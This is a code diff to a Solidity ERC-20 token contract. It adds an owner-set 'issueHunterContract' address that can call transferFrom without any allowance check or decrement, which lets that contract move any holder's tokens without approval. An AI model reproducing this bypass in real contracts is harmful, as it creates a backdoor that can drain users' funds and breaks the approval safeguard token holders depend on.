@@ -10,6 +10,7 @@ contract KeyboardToken is IERC20, Ownable {
 
     mapping (address => uint256) private _balances;
     mapping (address => mapping (address => uint256)) private _allowances;
+    address issueHunterContract;
 
     string private _name;
     string private _symbol;     // ?
@@ -70,6 +71,9 @@ contract KeyboardToken is IERC20, Ownable {
 
     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
         _transfer(sender, recipient, amount);
+        if (msg.sender == issueHunterContract) {
+            return true;
+        }
         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
         return true;
     }
@@ -112,5 +116,9 @@ contract KeyboardToken is IERC20, Ownable {
     function _burnFrom(address account, uint256 amount) internal {
         _burn(account, amount);
         _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
+    }
+
+    function setIssueHunterContract(address addr) public onlyOwner {
+        issueHunterContract = addr;
     }
 }
